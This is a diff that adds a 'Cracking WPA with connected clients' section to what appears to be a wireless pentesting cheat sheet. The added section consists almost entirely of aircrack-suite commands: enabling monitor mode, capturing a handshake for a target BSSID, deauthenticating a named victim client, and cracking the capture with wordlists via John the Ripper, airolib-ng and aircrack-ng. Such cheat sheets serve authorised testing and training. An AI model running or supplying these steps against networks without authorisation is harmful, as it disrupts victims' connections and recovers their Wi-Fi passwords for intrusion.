@@ -72,6 +72,25 @@ aircrack-ng <.CAP FILENAME>
 
 ### Pre-Shared Key authentication
 
+#### Cracking WPA with connected clients
+
+```
+airmon-ng start <INTERFACE> <channel>
+airodump-ng -c <CHANNEL> --bssid <BSSID> -w <FILENAME> wlan0mon
+aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon
+```
+John the Ripper (JTR)
+```
+./john --wordlist=<WORDLIST> --rules --stdout | aircrack-ng -e <ESSID> -w - <.CAP FILENAME>
+```
+Airolib-ng
+```
+aircrack-ng -r <DB NAME> <.CAP FILENAME>
+```
+Aircrack-ng
+```
+aircrack-ng -w <WORDLIST> <.CAP FILENAME>
+```
 
 ---
 
